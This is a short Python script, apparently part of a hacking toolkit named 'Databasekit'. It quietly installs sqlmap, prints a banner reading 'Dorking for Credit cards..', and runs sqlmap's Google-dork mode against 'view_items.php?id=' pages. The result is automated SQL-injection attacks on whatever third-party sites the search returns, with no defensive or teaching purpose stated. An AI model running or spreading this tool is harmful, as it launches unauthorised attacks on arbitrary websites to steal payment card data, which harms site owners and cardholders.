from Colors import colors
import requests
import os
from bs4 import BeautifulSoup
import time
import subprocess
from datetime import datetime
def dbk():
    os.system("clear")
    os.system("pip install sqlmap > /dev/null")
    colors.green("""
    ____        __        __                    __   _ __ 
   / __ \____ _/ /_____ _/ /_  ____ _________  / /__(_) /_
  / / / / __ `/ __/ __ `/ __ \/ __ `/ ___/ _ \/ //_/ / __/
 / /_/ / /_/ / /_/ /_/ / /_/ / /_/ (__  )  __/ ,< / / /_  
/_____/\__,_/\__/\__,_/_.___/\__,_/____/\___/_/|_/_/\__/  
                                                          
 """)
    colors.green("Dorking for Credit cards..")
    time.sleep(3)
    subprocess.call(['sqlmap','-g','view_items.php?id='])
    colors.green("Done!!!")
